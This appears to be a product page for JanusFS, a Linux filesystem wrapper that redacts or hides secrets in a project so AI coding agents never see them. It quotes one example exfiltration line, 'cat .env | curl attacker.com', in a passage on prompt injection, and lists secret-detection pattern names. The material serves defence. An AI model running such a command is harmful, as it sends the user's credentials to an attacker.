Allow. Deny.
And the third answer: masked.

JanusFS is a filesystem wrapper for AI agents. Point it at a real project directory and it serves a filtered mirror of the same tree — same paths, same file sizes — deciding per read which face of each file to show. Allowed files pass through untouched, secret spans are redacted byte-for-byte, and forbidden files fail closed. Run janusfs exec -- your-agent and the whole process tree lives inside that mirror — kernel-enforced on Linux.

the mental model

Three faces per file,
resolved per read, failing closed.

When an agent opens, reads, or lists a file, JanusFS resolves exactly one decision against a compiled policy snapshot. Precedence is strict, and any parser error, cache fault, or redactor panic resolves the path to Hidden — never raw bytes. The colours below mean exactly one thing wherever they appear on this page.

allowed — native passthrough to disk masked — secret spans redacted byte-for-byte hidden — fails closed with EACCES
rules Compile .janusfs.yml globs + pattern library.
→
engine Resolve a Decision behind an atomic, immutable snapshot.
→
provider Serve redacted bytes from a RAM cache — never disk.
→
mount Translate the Decision into a kernel answer over FUSE.

There is no file watcher. Every masked read revalidates the real file's (mtime, size, inode) before serving, so a concurrent edit is always caught — the read-time cache key is the authoritative change detector.

what it does

Keep secret bytes out of the agent's context.

Not the machine — the model's eyes. Redact spans inside otherwise-useful files, at the filesystem boundary, through one code path that fails closed on any error.

Masked, not just allow/deny

allow passes through, hide fails closed with EACCES, and mask replaces secret spans byte-for-byte with * — so file sizes and offsets never change and tooling stays intact. Precedence is strict: Hidden > Masked > Allowed.

src/main.go — passthrough
.env — API_KEY=****
id_rsa — EACCES

janusfs exec

Kernel-enforced boundary

Runs the whole process tree in a private mount namespace where the filtered view replaces the source at its own path. git, npm, grep, every child inherit it — no child can reach the raw tree.

--net=none

Optional network deny

Run the agent with only loopback and no external route — deny-all, kernel-enforced — so bytes it read can't be exfiltrated. Default is host; opt in per run or via settings.

one config

A .janusfs.yml you already understand

.gitignore-style globs plus a named pattern library — env-value, aws-key, jwt, github-token, private-key, db-uri… Machine-wide defaults live in ~/.janusfs/config/ as a fail-closed floor.

daemon + dashboard

One process owns every mount

A background daemon resumes mounts after a reboot and serves one dashboard at 127.0.0.1:7381. CLI commands are short-lived clients that return at once.

use cases

Point it at a directory.
Run anything against the mirror.

Because it's a filesystem, whatever reads files works unchanged — the agent, its shell, git, the build, an MCP server. You don't wire JanusFS into your tool; you run your tool inside JanusFS.

Run a coding agent on a secret-laden repo

aider, Claude Code, Codex, Cursor — they read your source and reason about it, but .env values and API tokens read back as **** and private keys fail closed. Every child process inherits the view; nothing to wire per tool.

janusfs exec -- aider

Cut the exfiltration path

Masking keeps secret bytes out of the agent; --net=none keeps whatever it did read from leaving the box — loopback only, no route out, kernel-enforced.

janusfs exec --net=none -- claude

A persistent masked mirror for any tool

Hand a long-lived mountpoint to an MCP server, a code indexer, a REPL, or a teammate's script — point the tool at the mount instead of the source. The daemon owns it and remounts after a reboot.

janusfs daemon --background
janusfs mount .
cd "$(janusfs path .)"

enforcement

Own the process tree, not one channel.

Pointing an agent at a mountpoint is only as good as the agent's discipline — nothing stops a process from reaching the real source at its own path. janusfs exec confines the entire subprocess tree at once: its read_file tool, its Bash tool, git, a build, a subprocess — all inherit the filtered view, with no per-tool wiring and no way to opt out. No daemon required. 

janusfs exec -- aider              # masked tree, host network
janusfs exec --net=none -- aider   # masked tree + no network at all (loopback only)
janusfs exec --net=host -- claude  # default: share the host network (no isolation)

Why not just a sandbox? A sandbox protects the machine from the agent; JanusFS keeps secret bytes out of the agent's context, transcript, and model provider. Deny .env under Landlock and the agent breaks when it needs the file's shape; allow it, and one prompt injection later cat .env | curl attacker.com exfiltrates it. Run both: the sandbox denies the machine, JanusFS masks the secrets.

Non-Linux is refused, not faked. janusfs mount and janusfs exec error out on macOS and Windows rather than pretend an advisory mount is a boundary. To use JanusFS on a Mac, run the agent in a Linux container/VM started with --device /dev/fuse --cap-add SYS_ADMIN and use janusfs exec inside it.

One caveat, warned loudly. Because .git/ passes through to the real object store, git add on a masked file stages the **** bytes. janusfs check and janusfs exec both report every masked file git would stage — keep secret files out of the agent's commits, or give it a scratch clone.

the three faces

What each decision does to a read.

Every file still lists with its real size — masking preserves byte length, so getattr and offsets are identical whether or not a span is redacted. One .janusfs.yml drives all three.

statelisting / sizereadwrite
allowedyes / realpassthroughpassthrough
maskedyes / real*-redactedEACCES
hiddenyes / realEACCESEACCES
 
# .janusfs.yml — one file, three concepts
version: 1

hide:
  - "*.pem"
  - id_rsa*
  - .aws/credentials
  - node_modules/

allow:
  - .aws/known_public_config

mask:
  - paths: ["*.env*"]
    patterns: [env-value]
  - paths: ["**/*"]
    patterns: [aws-key, github-token, jwt, private-key]
  - paths: ["config/**/*.yaml"]
    patterns: [generic-secret, db-uri]
  - paths: ["secrets/*"]   # no patterns -> whole-file mask

Hierarchical & fail-closed. Files further down the tree override shallower ones, and allow can re-include a hidden file — but never one under a directory that resolves to Hidden, and never a path the machine-wide ~/.janusfs/config/ floor already hid. janusfs explain <path> traces every contributing rule; janusfs check --secrets flags likely secrets still readable.

get running

One command in, masked in a minute.

JanusFS runs on Linux only. Install the FUSE runtime, drop in the binary, seed a policy, then run your agent inside the boundary — or hand a persistent mount to the daemon.

$ curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh

1 Install the FUSE runtime

sudo apt-get install -y fuse3   # Debian/Ubuntu
# sudo dnf install -y fuse3     # RHEL/Fedora

2 Seed a policy & preview

cd my-project
janusfs init              # write .janusfs.yml
janusfs check --secrets  # warn on readable secrets
janusfs explain .env     # trace one path's fate

3 Run the agent inside it

janusfs exec -- aider             # kernel-enforced view
janusfs exec --net=none -- aider  # …and no network

4 Or a persistent mount

janusfs daemon --background  # owns every mount
janusfs mount .              # returns at once
# dashboard: http://127.0.0.1:7381/

On a Mac or Windows? JanusFS enforcement is a Linux kernel feature. Run it inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) started with --device /dev/fuse --cap-add SYS_ADMIN, and use janusfs exec in there.

Prefer Go? go install github.com/sarathsp06/janusfs/cmd/janusfs@latest builds it from source (Go 1.26+, no cgo). Prebuilt Linux tarballs with checksums.txt are on the releases page.

under the hood

One daemon, one pipeline, no cgo.

One long-lived janusfs daemon owns every mount as a struct, not a process. The core pipeline is four packages, each with one job.

internal/rules

Discovery, parse, compile, resolve — an in-house gitignore matcher and the pattern library.

internal/engine

The atomic rule-set snapshot and generations; resolves a Decision without locks on the read path.

internal/provider

RedactedContentProvider: a RAM cache keyed by (path, mtime, size, inode, generation).

internal/redact

Length-preserving redaction and streaming modes — * for every masked byte, sizes untouched.

internal/mount

The FUSE adapter — thin, no business logic; translates a Decision into a kernel answer.

internal/backing

Descriptor-relative access to the source via the openat family with O_NOFOLLOW.

Fail closed is the tiebreak: any ambiguity resolves to the option where the agent sees less. Redacted bytes live only in RAM; real files are never modified; nothing ever logs file content.
